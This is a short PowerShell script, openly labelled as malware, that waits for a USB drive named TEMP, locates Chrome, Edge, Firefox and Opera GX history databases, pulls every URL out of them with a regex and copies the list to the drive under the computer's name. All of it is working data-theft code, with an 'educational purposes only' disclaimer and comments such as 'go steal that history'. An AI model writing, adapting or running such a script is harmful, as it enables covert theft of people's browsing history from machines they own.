# Powershell malware that grabs your browsing history and downloads to a flash drive
# by Cayden Wright
# 1/02/2023
# educational purposes only

#timeout for flash drive detection
$timeout = 30
#name of USB drive to exfiltrate data to
$DriveName = "TEMP"

function TestForUSB($DriveName) {
    #wait for usb to be inserted
    #kinda dirty using try/catch but whatever
    try { Get-Volume -FriendlyName $DriveName -ErrorAction Stop }
    catch { return $false }
}

function GetBrowserPaths() {
    #returns an array of every path in the below list that has data
    $chrome = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    $edge = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    $firefox = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    $opera = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    $browsers = $chrome, $edge, $firefox, $opera
    $paths_to_search = @()
    foreach ($file in $browsers) {
        if (Test-Path -Path $file) { $paths_to_search += $file }
    }
    return $paths_to_search
}

function GetHistory($paths, $out_file) {
    #goes through an array of files and writes them to a file

    #stole a lot of this code and this regex from I Am Jakoby
    $url_regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    foreach ($path in $paths) {
        Write-Output "FOUND IN ${path}" | Out-File $out_file -Append
        $urls = Get-Content -Path $paths | Select-String -AllMatches $url_regex | ForEach-Object { ($_.Matches).Value } | Sort-Object -Unique
        Write-Output $urls | Out-File $out_file -Append
    }
}

#wait for USB stick to be inserted
$FailCount = 0
while ((TestForUSB($DriveName)) -eq $false) {
    $FailCount = $FailCount + 1
    if ($FailCount -eq $timeout) { exit }
    Start-Sleep -Seconds 1
}
#get paths to search
$paths = GetBrowserPaths

#get drive letter, generate filename and full path of file
$driveLetter = (Get-Volume -FileSystemLabel $DriveName).DriveLetter
$filename = Get-Date -Format "MM_dd_yyyy-HH_mm"
$filename = $env:computername + '-' + $filename
$out_path = ($driveLetter + ':\' + $filename + '.txt')

#and go steal that history
GetHistory $paths $out_path